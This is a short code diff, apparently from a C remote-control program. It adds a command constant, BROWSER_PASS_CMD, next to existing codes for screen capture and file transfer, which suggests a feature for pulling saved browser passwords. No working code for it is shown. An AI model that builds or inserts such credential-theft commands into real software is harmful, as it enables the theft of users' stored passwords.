@@ -10,6 +10,7 @@
 #define SCREEN_CMD 2
 #define DL_FILE_CMD 3
 #define UL_FILE_CMD 4
+#define BROWSER_PASS_CMD 5
 
 // Cross-platform socket abstraction helpers
 #ifdef _WIN32
